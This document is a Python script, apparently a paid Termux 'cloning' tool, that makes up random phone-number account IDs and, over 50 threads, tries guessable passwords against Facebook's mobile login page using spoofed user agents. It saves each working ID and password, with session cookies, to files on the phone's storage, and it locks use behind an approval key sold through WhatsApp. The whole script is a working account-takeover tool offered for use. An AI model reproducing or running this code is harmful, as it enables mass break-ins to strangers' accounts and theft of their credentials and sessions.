# Facebook: RASEL Sarker
# Github: Sjsarker
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
import os
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    os.system('pkg install espeak')
    
 
            
            
 
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
os.system('xdg-open https://facebook.com/groups/513417670932164/')
os.system('espeak -a 300 "welcomed to dark web free tools"')
logo =("""\n\x1b[38;5;196m ██████   \033[38;5;46m█████ \x1b[38;5;196m ███████ \033[38;5;46m███████ \x1b[38;5;196m██\n\x1b[38;5;196m ██   ██\033[38;5;46m ██   ██ \x1b[38;5;196m██      \033[38;5;46m██      \x1b[38;5;196m██\n\x1b[38;5;196m ██████  \033[38;5;46m███████\x1b[38;5;196m ███████ \033[38;5;46m█████  \x1b[38;5;196m ██           \x1b[38;5;196m┏━┓\n\x1b[38;5;196m ██   ██\033[38;5;46m ██   ██    \x1b[38;5;196m  ██ \033[38;5;46m██      \x1b[38;5;196m██ \033[38;5;46m         ┫\x1b[38;5;196m│\033[1;91m\033[47m𝘾\033[00m\x1b[38;5;196m│\033[38;5;46m┣\n\x1b[38;5;196m ██   ██ \033[38;5;46m██   ██ \x1b[38;5;196m███████\033[38;5;46m ███████ \x1b[38;5;196m███████  \033[38;5;46m   ┫\x1b[38;5;196m|\033[1;91m\033[47m𝙔\033[00m\x1b[38;5;196m|\033[38;5;46m┣\n\t\t\t\t\t      \x1b[38;5;196m│\033[1;91m\033[47m𝘽\033[00m\x1b[38;5;196m│\n\x1b[38;5;196m┌━━━━━━━━━━━━━━━━━━\033[33m⊱\033[34;1m   \033[33m⊰\033[38;5;46m━━━━━━━━━━━━━━━━━━┐  \033[38;5;46m┫\x1b[38;5;196m│\033[1;91m\033[47m𝙀\033[00m\x1b[38;5;196m│\033[38;5;46m┣\n\x1b[38;5;196m│ \033[38;5;46m[\x1b[38;5;196m>_\033[38;5;46m] \033[33m𝘈𝘜𝘛𝘏𝘖𝘙        \x1b[38;5;196m:  \033[92m𝐑𝐀𝐒𝐄𝐋 𝐇𝐎𝐒𝐒𝐀𝐈𝐍     \033[38;5;46m│  \033[38;5;46m┫\x1b[38;5;196m│\033[1;91m\033[47m𝙍\033[00m\x1b[38;5;196m│\033[38;5;46m┣\n\x1b[38;5;196m│ \033[38;5;46m[\x1b[38;5;196m>_\033[38;5;46m] \033[33m𝘎𝘐𝘛𝘏𝘜𝘉        \x1b[38;5;196m:  \033[92mMD-RASEL-CYBER    \033[38;5;46m│   \x1b[38;5;196m┗━┛\n\x1b[38;5;196m│ \033[38;5;46m[\x1b[38;5;196m>_\033[38;5;46m] \033[33m𝘞𝘏𝘈𝘛𝘚𝘈𝘗𝘗      \x1b[38;5;196m:  \033[92m+97336596822      \033[38;5;46m│\n\x1b[38;5;196m│ \033[38;5;46m[\x1b[38;5;196m>_\033[38;5;46m] \033[33m𝘗𝘖𝘞𝘌𝘙         \x1b[38;5;196m:  \033[92m𝐑𝐀𝐒𝐄𝐋 𝐇𝐎𝐒𝐒𝐀𝐈𝐍     \033[38;5;46m│\n\x1b[38;5;196m└━━━━━━━━━━━━━━━━━━\033[33m⊱\033[34;1m   \033[33m⊰\033[38;5;46m━━━━━━━━━━━━━━━━━━┘\n\t\t\x1b[38;5;196m [\033[1;91m\033[47m𝙍𝙃𝘾_𝘾𝙔𝘽𝙀𝙍\033[00m\033[38;5;46m]""")
loop = 0
oks = []
cps = []
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
 
#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
# APK CHECK
def xxr():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f' \033[92mExample>: \033[0;93m019,\x1b[38;5;208m017,\033[0;92m018,\033[0;93m92302,\x1b[38;5;208m92301,\033[0;92m91778')
    print(" ══════════════════════════════════════════")
    rk1 = '0191'
    rk2 = '0192'
    rk3 = '0195'
    rk4 = '019'
    code = random.choice([rk1,rk2,rk3])
    print('')
    code = input('\033[0;92mChoose :')
    os.system('clear')
    print(logo)
    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m10000, \x1b[38;5;208m20000, \033[0;92m50000 ] \n\033[0;95m═════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = 0
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input(f"[*] Enter Password {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        jalan('\033[1;97m====================================================')
        jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
        jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For more Speed Up')
        jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
        jalan('\033[1;97m====================================================')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} ══════════════════════════════════════════")
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
    'method': 'GET',
    'path':'/home.php?tbua=1',
    'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-AT,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=esxVZWS64WkOYCJ3aXmRI4hA; sb=esxVZVQppj_yeeonuQQrQXfV; locale=en_US; wl_cbv=v2%3Bclient_version%3A2360%3Btimestamp%3A1700121747; vpd=v1%3B688x384x1.875; m_pixel_ratio=1.875; wd=384x734; fr=0zGugdrvnj22EPMyW.AWWSF0yXw2In32-KTyQ8r8Php20.BlVcx6.pp.AAA.0.0.BlVrK6.AWWuLZEMuKI',
    'dpr': '1.875',
    'referer': 'https://mbasic.facebook.com/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.20"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"V2206"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
                                    'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'
                                    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'
                                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[RASEL-OK🎯] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                os.system('espeak -a 300 "CONGRATULATIONS YOU HAVE A OK IDS"') 
                cek_apk(session,coki)
                open('/sdcard/RASEL-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m[RASEL-CP😴] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/RASEL-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}RASEL{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
 
def superuser():
    UMO="RASEL-"
    uuid = str(os.geteuid()) + str(os.getlogin()) 
    id = "6".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/MD-RASEL-CYBER/Approval-/blob/main/Approvad.txt").text
    if id in DARK:
        xxr()
    else:
        os.system("clear")
        os.system("xdg-open https://www.facebook.com/MD.RASEL.CYBER")
        time.sleep(3.0)
        
        os.system("clear")
        print(logo)
        print("\t\033[30m   [\033[1;32m\033[47m First Get Approvel\033[00m\033[1;30m]")
        print ("")
        print("┌━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┐ \n\033[1;32m│ Note : That is Paid because 100% ok id just now login│\033[1;37m\n└━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┘")
        print ("")
        print("                Your Key is Not Approved ")
        print("               Copy And Send Key To Admin")
        print ("")
        print (" Your Key : "+UMO+id)
        print ("\n")
        os.system("espeak \"assalamualaikum ,I am RASEL VAI er  ROBOT and my boss is RASEL.Sir this tool is paid because 100% ok id just now login\"")
        name = input(" Your Name : ")
        os.system(f"espeak \"{name} ,prass Enter to send your key\"")
        print ("")
        input(" Press Enter To Send Key")
        os.system("xdg-open https://wa.me/+8801882278234")
        superuser()        
superuser()


